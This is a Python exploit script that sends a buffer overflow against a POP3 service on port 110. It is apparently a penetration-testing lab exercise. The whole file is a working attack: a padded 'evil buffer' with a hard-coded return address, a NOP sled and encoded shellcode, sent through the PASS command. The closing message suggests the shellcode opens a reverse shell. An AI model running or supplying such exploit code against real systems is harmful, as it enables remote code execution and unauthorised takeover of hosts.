#!/usr/bin/env python3

import socket


TARGET_IP                    =    "192.168.1.62"



shellcode = ("\xda\xda\xba\x39\x49\xe5\xc4\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x13\x03\x6f\x5a\x07\x31\x73\xb4\x45"
"\xba\x8b\x45\x2a\x32\x6e\x74\x6a\x20\xfb\x27\x5a\x22\xa9\xcb"
"\x11\x66\x59\x5f\x57\xaf\x6e\xe8\xd2\x89\x41\xe9\x4f\xe9\xc0"
"\x69\x92\x3e\x22\x53\x5d\x33\x23\x94\x80\xbe\x71\x4d\xce\x6d"
"\x65\xfa\x9a\xad\x0e\xb0\x0b\xb6\xf3\x01\x2d\x97\xa2\x1a\x74"
"\x37\x45\xce\x0c\x7e\x5d\x13\x28\xc8\xd6\xe7\xc6\xcb\x3e\x36"
"\x26\x67\x7f\xf6\xd5\x79\xb8\x31\x06\x0c\xb0\x41\xbb\x17\x07"
"\x3b\x67\x9d\x93\x9b\xec\x05\x7f\x1d\x20\xd3\xf4\x11\x8d\x97"
"\x52\x36\x10\x7b\xe9\x42\x99\x7a\x3d\xc3\xd9\x58\x99\x8f\xba"
"\xc1\xb8\x75\x6c\xfd\xda\xd5\xd1\x5b\x91\xf8\x06\xd6\xf8\x94"
"\xeb\xdb\x02\x65\x64\x6b\x71\x57\x2b\xc7\x1d\xdb\xa4\xc1\xda"
"\x1c\x9f\xb6\x74\xe3\x20\xc7\x5d\x20\x74\x97\xf5\x81\xf5\x7c"
"\x05\x2d\x20\xd2\x55\x81\x9b\x93\x05\x61\x4c\x7c\x4f\x6e\xb3"
"\x9c\x70\xa4\xdc\x37\x8b\x2f\x23\x6f\x92\x93\xcb\x72\x94\xea"
"\xb0\xfa\x72\x86\xd6\xaa\x2d\x3f\x4e\xf7\xa5\xde\x8f\x2d\xc0"
"\xe1\x04\xc2\x35\xaf\xec\xaf\x25\x58\x1d\xfa\x17\xcf\x22\xd0"
"\x3f\x93\xb1\xbf\xbf\xda\xa9\x17\xe8\x8b\x1c\x6e\x7c\x26\x06"
"\xd8\x62\xbb\xde\x23\x26\x60\x23\xad\xa7\xe5\x1f\x89\xb7\x33"
"\x9f\x95\xe3\xeb\xf6\x43\x5d\x4a\xa1\x25\x37\x04\x1e\xec\xdf"
"\xd1\x6c\x2f\x99\xdd\xb8\xd9\x45\x6f\x15\x9c\x7a\x40\xf1\x28"
"\x03\xbc\x61\xd6\xde\x04\x81\x35\xca\x70\x2a\xe0\x9f\x38\x37"
"\x13\x4a\x7e\x4e\x90\x7e\xff\xb5\x88\x0b\xfa\xf2\x0e\xe0\x76"
"\x6a\xfb\x06\x24\x8b\x2e")

print("LENGTH " + str(len(shellcode)))

buffer = "\x41" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

print("\nSending evil buffer ...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP,110))
data = s.recv(1024)
s.send("USER username\r\n".encode("ISO-8859-1"))
data = s.recv(1024)
s.send(("PASS " + buffer + "\r\n").encode("ISO-8859-1"))
s.close()
print("DONE. Did you get a reverse shell?")
